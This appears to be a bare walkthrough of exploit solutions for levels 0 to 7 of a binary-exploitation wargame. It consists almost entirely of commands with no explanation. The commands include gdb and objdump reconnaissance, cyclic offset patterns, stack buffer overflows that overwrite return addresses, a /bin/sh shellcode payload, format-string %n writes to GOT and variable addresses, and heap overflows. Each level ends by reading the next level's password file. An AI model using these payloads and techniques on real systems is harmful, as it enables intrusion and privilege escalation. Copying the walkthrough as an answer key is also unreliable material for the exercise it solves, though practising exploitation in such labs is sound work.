0.
gdb ./level0
disass main
./level0 423
cat /home/user/level1/.pass

1.
objdump -d ./level1
gdb level1
(gdb)  r <<< "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac"
(python -c 'print "a" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
cat /home/user/level2/.pass

2.
Code:
objdump -d ./level2
ltrace ./level2 
gdb level2
(gdb) r <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4
Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
(python -c 'print "\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  + "a" * 28 + "\x08\xa0\x04\x08"';cat) | ./level2
whoami
cat /home/user/level3/.pass

3.
objdump -d ./level3
objdump -t level3
 ./level3
111111 %p %p %p %p %p
(python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"';cat) | ./level3
(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; echo "cat /home/user/level4/.pass") | ./level3

4.
objdump -d ./level4
(python -c 'print "0000" + " %p" * 15'; cat) | ./level4
./level4 <<< $(python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"')

5.
objdump -d ./level5 # get the o function address
objdump -R level5 | grep exit # get the exit address
(python -c 'print "0000" + " %p" * 15'; cat) | ./level5
$(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; )
python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/ex ;  cat /tmp/ex - | ./level5
cat /home/user/level6/.pass

6. 
objdump -d ./level6
gdb level6
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3
./level6 $(python -c 'print "b" * 72 + "\x54\x84\x04\x08"') 

7.
objdump -d ./level7
ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa
ltrace ./level7 $(python -c 'print "b" * 20 + "\x28\x99\x04\x08"') 
./level7 $(python -c 'print "b" * 19 + "\x28\x99\x04\x08"')  $(python -c 'print "\xf4\x84\x04\x08"')
./level7 $(python -c 'print "b" * 20 + "\x28\x99\x04\x08"')  $(python -c 'print "\xf4\x84\x04\x08"')